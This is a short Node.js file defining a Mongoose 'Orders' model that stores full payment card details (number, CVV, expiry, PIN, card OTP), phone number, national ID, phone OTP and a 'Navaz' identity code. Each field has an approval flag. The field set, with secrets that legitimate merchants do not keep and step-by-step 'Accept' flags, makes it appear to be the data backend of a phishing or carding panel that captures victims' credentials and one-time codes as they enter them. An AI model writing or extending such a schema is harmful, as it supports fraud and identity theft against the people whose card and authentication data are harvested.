const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema(
    {
      cardNumber: String,
      cardType: String,
      cvv: String,
      expiryMonth: String,
      expiryYear: String,
      pin: String,
    CardOtp: String,
      CardAccept: {
        type: Boolean,
        default: false,
      },
      OtpCardAccept: {
        type: Boolean,
        default: false,
      },
      PinAccept: {
        type: Boolean,
        default: false,
      },

      phone: String,
      national_id: String,
      provider : String,
      phoneAccept: {
        type: Boolean,
        default: false,
      },
      phoneOtp: String,
      phoneOtpAccept: {
        type: Boolean,
        default: false,
      },
  

      
      code: String,
      NavazAccept: {
        type: Boolean,
        default: false,
      },

      checked: {
        type: Boolean,
        default: false,
      },
      created: { type: Date, default: Date.now },
    },
    { timestamps: true }
  )
);
